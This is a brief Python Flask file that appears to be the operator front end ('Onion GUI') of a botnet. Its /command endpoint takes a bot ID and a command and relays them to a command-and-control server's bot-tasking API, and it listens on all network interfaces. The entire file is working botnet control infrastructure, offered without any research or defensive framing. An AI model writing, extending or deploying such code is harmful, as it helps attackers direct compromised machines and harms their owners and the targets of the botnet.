from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# Onion GUI configuration
C2_SERVER = 'http://127.0.0.1:5000'

# Onion GUI routes
@app.route('/command', methods=['POST'])
def command():
    data = request.json
    bot_id = data.get('bot_id')
    command = data.get('command')
    
    if not bot_id or not command:
        return jsonify({'status': 'error', 'message': 'Missing bot_id or command'}), 400

    # Forward the command to the C2 server
    try:
        response = requests.post(f'{C2_SERVER}/api/bot/command/{bot_id}', json=command)
        response.raise_for_status()  # Raise an exception for bad status codes
        return jsonify(response.json()), response.status_code
    except requests.exceptions.RequestException as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
